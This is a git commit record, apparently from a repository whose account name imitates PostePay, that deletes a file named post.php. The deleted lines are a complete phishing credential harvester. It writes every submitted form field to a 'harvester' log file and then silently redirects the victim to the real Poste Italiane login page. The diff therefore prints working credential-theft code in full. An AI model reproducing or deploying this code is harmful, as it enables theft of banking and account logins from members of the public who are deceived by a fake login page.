ec6abdd1cedf3ef8a8d6136ab01c0e00d56e73e3
POSTEPAY <61477140+POSTEPAY@users.noreply.github.com>
2020-02-26 04:49:51 -0500

    Delete post.php

--- post.php
+++
@@ -1,2 +0,0 @@
-<?php $file = 'harvester_2020-02-25 15:38:20.935496.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND); 
-/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=https://securelogin.poste.it/jod-fcc/fcc-authentication.html" />
